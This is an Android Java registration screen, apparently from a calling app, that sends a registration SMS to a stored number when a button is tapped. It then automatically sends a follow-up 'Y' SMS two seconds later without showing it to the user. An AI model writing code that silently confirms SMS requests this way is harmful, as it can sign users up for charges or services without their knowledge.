package com.my898tel.ui;

import java.util.List;

import com.my898tel.R;
import com.my898tel.ui.dialog.DialogLoading;
import com.my898tel.util.StatWrapper;

import android.app.Dialog;
import android.app.PendingIntent;
import android.app.ProgressDialog;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.TextView;

/**
 * 注册页面
 * 
 * @author liusheng
 */
public class RegisterActivity extends BaseActivity implements  View.OnClickListener{
	private Dialog dialog;



	@Override
	protected void onCreate(Bundle arg0) {
		super.onCreate(arg0);
		setContentView(R.layout.login_activity);

		// 本地拨号
		findViewById(R.id.linear_bd).setOnClickListener(new View.OnClickListener() {

			@Override
			public void onClick(View v) {
				sentMsg(getResources().getString(R.string.bd_register_str), getResources().getString(R.string.tel));
				doSendMessage() ;
				sentSure();
			}
		});
		// 省内拨号
		findViewById(R.id.linear_sn).setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                sentMsg(getResources().getString(R.string.sn_register_str), getResources().getString(R.string.tel));
                doSendMessage();
                sentSure();
            }
        });

        setTitleNoRightBtn(R.string.user_register);

	}

	
	
	private void doSendMessage() {
		// TODO Auto-generated method stub
		dialog=DialogLoading.loadDialog(instance);
		handler.sendEmptyMessageDelayed(0, 10000);
	}
	public void sentMsg(String message, String mobile) {
		SmsManager smsManager = SmsManager.getDefault();
		PendingIntent sentIntent = PendingIntent.getBroadcast(RegisterActivity.this, 0, new Intent(), 0);
		if (message.length() >= 70) {
			// 短信字数大于70，自动分条
			List<String> ms = smsManager.divideMessage(message);
			for (String str : ms) {
				// 短信发送
				smsManager.sendTextMessage(mobile, null, str, sentIntent, null);
			}
		} else {
			smsManager.sendTextMessage(mobile, null, message, sentIntent, null);
		}
	}


	
	public void sentSure()
	{
		handler.postDelayed(new Runnable() {
			
			@Override
			public void run() {
				sentMsg("Y", getResources().getString(R.string.tel));
			}
		}, 2000);

	}
	private Handler handler = new Handler() {
		public void handleMessage(android.os.Message msg) {
			
			switch (msg.what) {
			case 0:
				Intent intent = new Intent();
				intent.setClass(RegisterActivity.this, GetMoneyActivity.class);
				startActivity(intent);
				finish();
				dialog.dismiss();
				break;
			default:
				break;
			}
		};
	};
	@Override
	protected void onResume() {
		super.onResume();
		StatWrapper.onResume(this);
	}

	@Override
	protected void onPause() {
		super.onPause();
		StatWrapper.onPause(this);
	}

    @Override
    public void onClick(View view) {

    }
}
